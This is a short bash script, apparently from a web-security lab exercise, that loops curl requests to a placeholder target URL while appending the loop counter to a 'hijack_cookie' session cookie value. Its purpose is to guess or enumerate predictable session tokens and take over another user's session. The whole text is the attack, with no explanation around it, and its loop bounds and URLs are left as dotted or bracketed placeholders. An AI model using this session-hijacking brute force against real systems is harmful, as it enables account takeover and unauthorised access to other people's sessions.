for i in $(seq 1........... 2............); do
curl '(url attack)'   \
-H 'Connection: keep-alive'   \
-H 'Accept: */*'   \
-H 'X-Requested-With: XMLHttpRequest'   \
-H 'User-Agent: any'   \
-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'   \
-H 'Origin: (url)'   \
-H 'Sec-Fetch-Site: same-origin'   \
-H 'Sec-Fetch-Mode: cors'   \
-H 'Sec-Fetch-Dest: empty'   \
-H 'Referer: (url attck)'   \
-H 'Accept-Language: en-US,en;q=0.9'   \
-H "Cookie: JSESSIONID=lJYoqNhLXYNXerN1RmpWkSATcIxXNcTbIiuyWfsL; hijack_cookie=7539973388127616389-"$i""   \
--data-raw 'username=&password='   \
--compressed
done
